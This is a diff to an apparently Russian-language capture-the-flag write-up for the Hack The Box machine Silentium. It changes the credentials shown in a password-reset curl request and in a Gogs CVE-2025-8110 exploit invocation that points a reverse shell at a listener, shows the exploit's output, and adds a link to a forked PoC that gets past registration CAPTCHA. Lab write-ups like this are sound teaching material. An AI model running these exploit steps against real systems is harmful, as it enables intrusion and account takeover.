@@ -102,7 +102,7 @@ curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
        "user":{
          "email":"ben@silentium.htb",
          "tempToken":"Y7Lu3Z5j52Hjc75m5nJr41ocV7Zuti78FLQl6fb2uppIw60QkfUiE9s9adpTdD83",
-         "password":"NewSecurePassword123!"
+         "password":"NewPassword"
        }
      }'
 ```
@@ -111,7 +111,7 @@ curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
 
 ### Вход и определение версии
 
-Логинимся с `ben@silentium.htb` / `NewSecurePassword123!`. В правом верхнем углу — значок шестерёнки, там версия:
+Логинимся с `ben@silentium.htb` / `NewPassword`. В правом верхнем углу — значок шестерёнки, там версия:
 
 ```
 Flowise 3.0.5
@@ -281,8 +281,8 @@ python3 CVE-2025-8110.py \
   -u http://localhost:3001 \
   -lh 10.10.14.144 \
   -lp 4444 \
-  -un zAbuQasem \
-  -pw SuperSecurePass123
+  -un NewUsers \
+  -pw GogsPassword
 ```
 
 ### Вывод эксплойта
@@ -298,7 +298,7 @@ Repo creation status: 201
  1 file changed, 1 insertion(+)
  create mode 120000 malicious_link
 ...
-To http://localhost:3001/zAbuQasem/caaafaf0fa74.git
+To http://localhost:3001/NewUsers/caaafaf0fa74.git
    8812c81..f5f79a4  master -> master
 [+] Exploit sent, check your listener!
 [-] Error: HTTPConnectionPool(host='localhost', port=3001): Read timed out. (read timeout=5)
@@ -392,10 +392,16 @@ Recon (nmap, ffuf)
 - `Read timed out` в web-эксплойтах — часто не ошибка, а признак, что payload отработал.
 - `ssh -N -L` надёжнее escape-последовательности `~C`.
 - Всегда проверяйте `env` в контейнере — секреты часто лежат там в открытом виде.
-- Не переиспользуйте пароли: один и тот же пароль от SMTP может открыть SSH.
 - Всегда проверяйте `RUN_USER` в конфигах сервисов — частая причина «бесплатного» root.
 - CVE-2025-8110 — отличный пример того, почему нельзя доверять симлинкам при работе с файловыми API.
 
----
+### Капча (CAPTCHA)
+
+Используется адаптированный под Silentium PoC:
+https://github.com/ixZODiAK/CVE-2025-8110
+
+Это форк оригинального zAbuQasem/gogs-CVE-2025-8110, который принимает
+флаги `-un` и `-pw` для уже существующего пользователя Gogs —
+это обходит капчу, включённую на Silentium (`ENABLE_REGISTRATION_CAPTCHA = true`).
 
 **Машина пройдена. GG!** 🚀
